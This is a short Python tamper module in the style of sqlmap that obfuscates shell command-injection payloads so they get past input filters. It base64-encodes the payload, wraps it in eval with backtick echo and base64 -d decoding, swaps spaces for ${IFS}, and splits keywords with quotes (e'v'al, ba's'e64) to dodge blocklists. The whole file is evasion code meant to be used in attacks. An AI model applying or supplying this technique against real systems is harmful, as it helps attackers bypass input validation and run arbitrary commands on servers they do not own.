from lib.core.convert import encodeBase64
import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    bash no spaces - not working on bourne shell (sh)
    """

    if re.search("^[A-Za-z0-9]",payload) == None:
      prefix=payload[:1]+"e'v'al${IFS}`e'c'ho${IFS}'"
      payloadb64=encodeBase64(payload[1:], binary=False)
      suffix="'|ba's'e64${IFS}-d`"
    
    else:
      prefix="e'v'al${IFS}`e'c'ho${IFS}'"
      payloadb64=encodeBase64(payload, binary=False)
      suffix="'|ba's'e64${IFS}-d`"

    return (prefix+payloadb64+suffix) if payload else payload

